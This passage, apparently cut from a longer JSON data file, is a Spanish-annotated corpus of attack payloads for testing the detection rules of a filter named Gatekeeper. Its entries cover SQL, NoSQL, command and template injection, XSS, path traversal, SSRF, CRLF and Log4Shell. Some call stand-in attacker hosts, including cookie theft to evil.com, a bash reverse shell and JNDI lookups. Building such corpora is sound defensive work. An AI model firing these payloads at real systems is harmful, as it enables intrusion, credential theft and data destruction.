{
  "description": "Corpus de ataques para medir la tasa de detección de Gatekeeper. Cada payload indica la regla esperada; ver corpus/README.md sobre procedencia y licencia.",
  "payloads": [
    {"id": "sqli-001", "rule": "sqli", "payload": "1' OR '1'='1", "note": "bypass de autenticación"},
    {"id": "sqli-002", "rule": "sqli", "payload": "1 OR 1=1", "note": "tautología booleana"},
    {"id": "sqli-003", "rule": "sqli", "payload": "admin'--", "note": "comentario que anula el resto de la consulta"},
    {"id": "sqli-004", "rule": "sqli", "payload": "1' ORDER BY 10--", "note": "sondeo del número de columnas"},
    {"id": "sqli-005", "rule": "sqli", "payload": "1 UNION SELECT username, password FROM users", "note": "UNION clásico"},
    {"id": "sqli-006", "rule": "sqli", "payload": "1 UNION ALL SELECT NULL, NULL, version()", "note": "UNION con versionado del servidor"},
    {"id": "sqli-007", "rule": "sqli", "payload": "'; DROP TABLE users;--", "note": "consulta apilada destructiva"},
    {"id": "sqli-008", "rule": "sqli", "payload": "1; DELETE FROM sessions;", "note": "borrado por consulta apilada"},
    {"id": "sqli-009", "rule": "sqli", "payload": "1; SELECT * FROM cuentas", "note": "lectura por consulta apilada"},
    {"id": "sqli-010", "rule": "sqli", "payload": "' AND SLEEP(5)#", "note": "blind time-based en MySQL"},
    {"id": "sqli-011", "rule": "sqli", "payload": "1' AND BENCHMARK(1000000,MD5('a'))--", "note": "time-based con CPU"},
    {"id": "sqli-012", "rule": "sqli", "payload": "1 AND pg_sleep(5)", "note": "time-based en PostgreSQL"},
    {"id": "sqli-013", "rule": "sqli", "payload": "WAITFOR DELAY '0:0:5'", "note": "time-based en SQL Server"},
    {"id": "sqli-014", "rule": "sqli", "payload": "1' UNION SELECT 1,2,3 FROM information_schema.tables--", "note": "enumeración del esquema"},
    {"id": "sqli-015", "rule": "sqli", "payload": "' OR EXISTS(SELECT * FROM usuarios)--", "note": "subconsulta con EXISTS"},
    {"id": "sqli-016", "rule": "sqli", "payload": "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--", "note": "error-based en SQL Server"},
    {"id": "sqli-017", "rule": "sqli", "payload": "extractvalue(1,concat(0x7e,version()))", "note": "error-based con EXTRACTVALUE"},
    {"id": "sqli-018", "rule": "sqli", "payload": "updatexml(1,concat(0x7e,user()),1)", "note": "error-based con UPDATEXML"},
    {"id": "sqli-019", "rule": "sqli", "payload": "' UNION SELECT load_file('/etc/passwd')--", "note": "lectura de ficheros con UNION"},
    {"id": "sqli-020", "rule": "sqli", "payload": "1'/**/OR/**/1=1", "note": "comentarios SQL como espaciador"},
    {"id": "sqli-021", "rule": "sqli", "payload": "%27%20OR%20%271%27%3D%271", "note": "codificado en URL"},
    {"id": "sqli-022", "rule": "sqli", "payload": "1'%20UNION%20SELECT%20password%20FROM%20users", "note": "UNION codificado"},
    {"id": "sqli-023", "rule": "sqli", "payload": "1%3BSELECT%20*%20FROM%20users", "note": "consulta apilada codificada"},
    {"id": "sqli-024", "rule": "sqli", "payload": "' or 1=1 limit 1 --", "note": "bypass con LIMIT"},
    {"id": "sqli-025", "rule": "sqli", "payload": "1; EXEC xp_cmdshell 'dir'", "note": "ejecución de comandos en SQL Server"},
    {"id": "sqli-026", "rule": "sqli", "payload": "') OR ('1'='1", "note": "cierre de paréntesis"},
    {"id": "sqli-027", "rule": "sqli", "payload": "1) OR (1=1", "note": "consulta con paréntesis"},
    {"id": "sqli-028", "rule": "sqli", "payload": "/**/union/**/select/**/1,2", "note": "UNION ofuscado con comentarios"},
    {"id": "sqli-029", "rule": "sqli", "payload": "' UNION SELECT @@version--", "note": "versión del servidor"},
    {"id": "sqli-030", "rule": "sqli", "payload": "1; EXEC sp_executesql N'SELECT 1'", "note": "dinamic SQL apilado"},
    {"id": "sqli-031", "rule": "sqli", "payload": "-1 UNION ALL SELECT null,concat(user,0x3a,version())--", "note": "volcado de usuario y versión"},
    {"id": "sqli-032", "rule": "sqli", "payload": "1' AND ASCII(SUBSTRING(nombre,1,1))>64--", "note": "blind boolean carácter a carácter"},

    {"id": "xss-001", "rule": "xss", "payload": "<script>alert(1)</script>", "note": "XSS básico"},
    {"id": "xss-002", "rule": "xss", "payload": "<SCRIPT SRC=http://evil.com/x.js></SCRIPT>", "note": "carga de script externo, mayúsculas"},
    {"id": "xss-003", "rule": "xss", "payload": "<img src=x onerror=alert(1)>", "note": "handler de evento"},
    {"id": "xss-004", "rule": "xss", "payload": "<svg/onload=alert(1)>", "note": "separador / sin espacios"},
    {"id": "xss-005", "rule": "xss", "payload": "<body onload=alert(1)>", "note": "handler en body"},
    {"id": "xss-006", "rule": "xss", "payload": "<iframe src=\"javascript:alert(1)\">", "note": "javascript: en iframe"},
    {"id": "xss-007", "rule": "xss", "payload": "<a href=\"javascript:alert(document.cookie)\">click</a>", "note": "javascript: en enlace"},
    {"id": "xss-008", "rule": "xss", "payload": "<input onfocus=alert(1) autofocus>", "note": "disparo automático con autofocus"},
    {"id": "xss-009", "rule": "xss", "payload": "<details open ontoggle=alert(1)>", "note": "ontoggle"},
    {"id": "xss-010", "rule": "xss", "payload": "<marquee onstart=alert(1)>x</marquee>", "note": "onstart"},
    {"id": "xss-011", "rule": "xss", "payload": "<object data=\"javascript:alert(1)\">", "note": "javascript: en object"},
    {"id": "xss-012", "rule": "xss", "payload": "\"><script>alert(document.cookie)</script>", "note": "ruptura de atributo"},
    {"id": "xss-013", "rule": "xss", "payload": "</title><script>alert(1)</script>", "note": "ruptura de etiqueta"},
    {"id": "xss-014", "rule": "xss", "payload": "<img src=x oNerroR=alert(1)>", "note": "case mixing"},
    {"id": "xss-015", "rule": "xss", "payload": "<script>document.location='http://evil.com/?'+document.cookie</script>", "note": "robo de cookies"},
    {"id": "xss-016", "rule": "xss", "payload": "%3Cscript%3Ealert(1)%3C/script%3E", "note": "codificado en URL"},
    {"id": "xss-017", "rule": "xss", "payload": "%253Cscript%253Ealert(1)", "note": "doble codificación"},
    {"id": "xss-018", "rule": "xss", "payload": "<svg><script>alert(1)</script></svg>", "note": "script anidado"},
    {"id": "xss-019", "rule": "xss", "payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "note": "payload en base64"},
    {"id": "xss-020", "rule": "xss", "payload": "<div style=\"background:url(javascript:alert(1))\">", "note": "javascript: en CSS"},
    {"id": "xss-021", "rule": "xss", "payload": "<form action=\"javascript:alert(1)\"><input type=submit>", "note": "javascript: en action"},
    {"id": "xss-022", "rule": "xss", "payload": "<isindex type=image src=1 onerror=alert(1)>", "note": "etiqueta obsoleta"},
    {"id": "xss-023", "rule": "xss", "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "note": "onbegin en SVG"},
    {"id": "xss-024", "rule": "xss", "payload": "<template><script>alert(1)</script></template>", "note": "script en template"},
    {"id": "xss-025", "rule": "xss", "payload": "<img/src=\"x\"/onerror=alert(1)>", "note": "separadores /"},
    {"id": "xss-026", "rule": "xss", "payload": "<<script>alert(1)//<</script>", "note": "etiqueta duplicada"},
    {"id": "xss-027", "rule": "xss", "payload": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>", "note": "data URI con HTML"},
    {"id": "xss-028", "rule": "xss", "payload": "<img alt=\"x\" src=x onerror=alert(String.fromCharCode(88,83,83))>", "note": "ofuscación de la cadena"},
    {"id": "xss-029", "rule": "xss", "payload": "&#60;script&#62;alert(1)&#60;/script&#62;", "note": "entidades HTML"},
    {"id": "xss-030", "rule": "xss", "payload": "<a href=&#106;avascript:alert(1)>x</a>", "note": "entidad en javascript:"},

    {"id": "trav-001", "rule": "path_traversal", "payload": "../../../../etc/passwd", "note": "traversal clásico"},
    {"id": "trav-002", "rule": "path_traversal", "payload": "..%2f..%2fetc%2fpasswd", "note": "codificado en URL"},
    {"id": "trav-003", "rule": "path_traversal", "payload": "%2e%2e/%2e%2e/etc/passwd", "note": "puntos codificados"},
    {"id": "trav-004", "rule": "path_traversal", "payload": "..%252f..%252fetc/passwd", "note": "doble codificación"},
    {"id": "trav-005", "rule": "path_traversal", "payload": "....//....//etc/passwd", "note": "puntos extra para normalizadores ingenuos"},
    {"id": "trav-006", "rule": "path_traversal", "payload": "..\\/..\\/etc/passwd", "note": "backslashes"},
    {"id": "trav-007", "rule": "path_traversal", "payload": "..\\..\\windows\\system32\\config\\sam", "note": "SAM de Windows"},
    {"id": "trav-008", "rule": "path_traversal", "payload": "..;/..;/etc/passwd", "note": "punto y coma para saltarse el normalizador"},
    {"id": "trav-009", "rule": "path_traversal", "payload": "%00../../etc/passwd", "note": "byte nulo prependido"},
    {"id": "trav-010", "rule": "path_traversal", "payload": "....\\/....\\/etc/passwd", "note": "combinación de puntos extra y backslash"},
    {"id": "trav-011", "rule": "path_traversal", "payload": "file:///etc/passwd", "note": "URL scheme file:"},
    {"id": "trav-012", "rule": "path_traversal", "payload": "/var/www/../../etc/shadow", "note": "salida de un directorio permitido"},
    {"id": "trav-013", "rule": "path_traversal", "payload": "..%c0%af..%c0%afetc/passwd", "note": "UTF-8 sobre-long"},

    {"id": "files-001", "rule": "sensitive_files", "payload": "/etc/shadow", "note": "hashes de contraseñas"},
    {"id": "files-002", "rule": "sensitive_files", "payload": "/etc/group", "note": "grupos del sistema"},
    {"id": "files-003", "rule": "sensitive_files", "payload": "/proc/self/environ", "note": "variables de entorno (secretos)"},
    {"id": "files-004", "rule": "sensitive_files", "payload": "/proc/self/cmdline", "note": "línea de comandos del proceso"},
    {"id": "files-005", "rule": "sensitive_files", "payload": "C:\\windows\\win.ini", "note": "fichero clásico de prueba"},
    {"id": "files-006", "rule": "sensitive_files", "payload": "/home/user/.ssh/id_rsa", "note": "clave privada SSH"},
    {"id": "files-007", "rule": "sensitive_files", "payload": "/var/www/app/.env", "note": "secretos de la aplicación"},
    {"id": "files-008", "rule": "sensitive_files", "payload": "web-inf/web.xml", "note": "configuración Java"},
    {"id": "sqli-090", "rule": "sqli", "payload": "1 /*!50000union*/ select password from users", "note": "comentario versionado de MySQL: el contenido se ejecuta"},
    {"id": "sqli-091", "rule": "sqli", "payload": "1%2F*!50000union*%2F+select+1,2,3", "note": "comentario versionado codificado"},
    {"id": "xss-090", "rule": "xss", "payload": "&lt;script&gt;alert(1)&lt;/script&gt;", "note": "entidades HTML nombradas (pendiente de 0.3.1 → hecho)"},
    {"id": "xss-091", "rule": "xss", "payload": "java\tscript:alert(1)", "note": "tab en medio del esquema: el navegador la descarta (WHATWG URL)"},
    {"id": "xss-092", "rule": "xss", "payload": "javascript&colon;alert(1)", "note": "entidad nombrada &colon; en el esquema"},
    {"id": "nosql-001", "rule": "nosql", "payload": "username[$ne]=x", "note": "bypass de login clásico con operador $ne"},
    {"id": "nosql-002", "rule": "nosql", "payload": "{\"user\": {\"$ne\": \"\"}}", "note": "$ne en JSON"},
    {"id": "nosql-003", "rule": "nosql", "payload": "password[$nin][]=root", "note": "bypass con $nin"},
    {"id": "nosql-004", "rule": "nosql", "payload": "$where=this.password.match(/^a/)", "note": "ejecución de JavaScript en MongoDB"},
    {"id": "nosql-005", "rule": "nosql", "payload": "name[$regex]=^adm", "note": "extracción carácter a carácter con regex"},
    {"id": "nosql-006", "rule": "nosql", "payload": "{\"token\": {\"$regex\": \"^sk-\"}}", "note": "exfiltración de secretos por $regex en JSON"},
    {"id": "nosql-007", "rule": "nosql", "payload": "user[%24ne]=x", "note": "operador codificado (%24 = $)"},
    {"id": "cmdi-001", "rule": "cmdi", "payload": "; ls -la /tmp", "note": "separador punto y coma + listado"},
    {"id": "cmdi-002", "rule": "cmdi", "payload": "| cat /var/log/syslog", "note": "pipe + lectura de logs"},
    {"id": "cmdi-003", "rule": "cmdi", "payload": "&& whoami", "note": "cadena de comandos con &&"},
    {"id": "cmdi-004", "rule": "cmdi", "payload": "$(id)", "note": "sustitución de comandos"},
    {"id": "cmdi-005", "rule": "cmdi", "payload": "`uname -a`", "note": "sustitución con backticks"},
    {"id": "cmdi-006", "rule": "cmdi", "payload": "powershell.exe -enc SQBFAFgA", "note": "LOLBin de Windows con .exe"},
    {"id": "cmdi-007", "rule": "cmdi", "payload": ";system('id')", "note": "webshell PHP con separador"},
    {"id": "cmdi-008", "rule": "cmdi", "payload": "shell_exec('cat /var/log/syslog')", "note": "función PHP de ejecución sin separador"},
    {"id": "cmdi-009", "rule": "cmdi", "payload": "bash -i >& /dev/tcp/10.0.0.1/4444", "note": "reverse shell clásica"},
    {"id": "ssrf-001", "rule": "ssrf", "payload": "http://169.254.169.254/latest/meta-data/", "note": "metadata AWS/GCP/Azure"},
    {"id": "ssrf-002", "rule": "ssrf", "payload": "http://169.254.170.2/v2/credentials", "note": "metadata ECS de AWS"},
    {"id": "ssrf-003", "rule": "ssrf", "payload": "http://metadata.google.internal/computeMetadata/v1/", "note": "metadata de Google"},
    {"id": "ssrf-004", "rule": "ssrf", "payload": "file:///var/www/app/config.php", "note": "esquema file:// de lectura local"},
    {"id": "ssrf-005", "rule": "ssrf", "payload": "gopher://127.0.0.1:6379/_SET%20x%20y", "note": "gopher contra Redis"},
    {"id": "ssrf-006", "rule": "ssrf", "payload": "dict://127.0.0.1:6379/info", "note": "esquema dict:// contra servicios internos"},
    {"id": "ssrf-007", "rule": "ssrf", "payload": "http://100.100.100.200/latest/meta-data/", "note": "metadata de Alibaba Cloud"},
    {"id": "ssti-001", "rule": "ssti", "payload": "{{7*7}}", "note": "prueba canónica Jinja2/Twig"},
    {"id": "ssti-002", "rule": "ssti", "payload": "{{ 9*9 }}", "note": "la misma prueba con espacios"},
    {"id": "ssti-003", "rule": "ssti", "payload": "${7*7}", "note": "prueba en plantillas genéricas"},
    {"id": "ssti-004", "rule": "ssti", "payload": "<%= 7*7 %>", "note": "prueba en ERB/JSP"},
    {"id": "ssti-005", "rule": "ssti", "payload": "#{7*7}", "note": "prueba en Ruby/Java EL"},
    {"id": "ssti-006", "rule": "ssti", "payload": "{{config.items()}}", "note": "volcado de configuración del servidor"},
    {"id": "ssti-007", "rule": "ssti", "payload": "{{self.__dict__['__init__']}}", "note": "escapada a objetos del entorno de plantillas"},
    {"id": "crlf-001", "rule": "crlf", "payload": "a\r\nSet-Cookie: admin=1", "note": "response splitting con salto real"},
    {"id": "crlf-002", "rule": "crlf", "payload": "%0d%0aLocation:%20http://evil.example", "note": "CRLF codificado + cabecera Location"},
    {"id": "crlf-003", "rule": "crlf", "payload": "line1\\r\\nX-Injected: yes", "note": "literal backslash-r backslash-n (JSON escapado)"},
    {"id": "crlf-004", "rule": "crlf", "payload": "ok%0d%0aSet-Cookie:%20session=hijack", "note": "secuestro de cookie por cabecera inyectada"},
    {"id": "log4shell-001", "rule": "log4shell", "payload": "${jndi:ldap://evil.example/a}", "note": "payload canónico de Log4Shell"},
    {"id": "log4shell-002", "rule": "log4shell", "payload": "${jndi:rmi://evil.example:1099/x}", "note": "JNDI sobre RMI"},
    {"id": "log4shell-003", "rule": "log4shell", "payload": "${${::-j}ndi:ldap://evil.example/a}", "note": "ofuscación con decoy del primer carácter"},
